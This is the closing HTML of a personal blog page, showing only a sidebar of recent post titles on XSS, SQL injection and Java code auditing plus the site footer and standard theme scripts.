no-cover"><div class="content"><a class="title" href="/2025/12/28/xss%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="xss代码审计学习">xss代码审计学习</a><time datetime="2025-12-28T02:16:48.000Z" title="发表于 2025-12-28 10:16:48">2025-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/24/sql%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="sql代码审计其2">sql代码审计其2</a><time datetime="2025-12-24T14:30:30.000Z" title="发表于 2025-12-24 22:30:30">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/17/sql%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%B6%E4%B8%80/" title="sql代码审计其一">sql代码审计其一</a><time datetime="2025-12-17T14:54:45.000Z" title="发表于 2025-12-17 22:54:45">2025-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86/" title="java代码审计之sql注入知识">java代码审计之sql注入知识</a><time datetime="2025-12-10T09:44:41.000Z" title="发表于 2025-12-10 17:44:41">2025-12-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By inyyy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
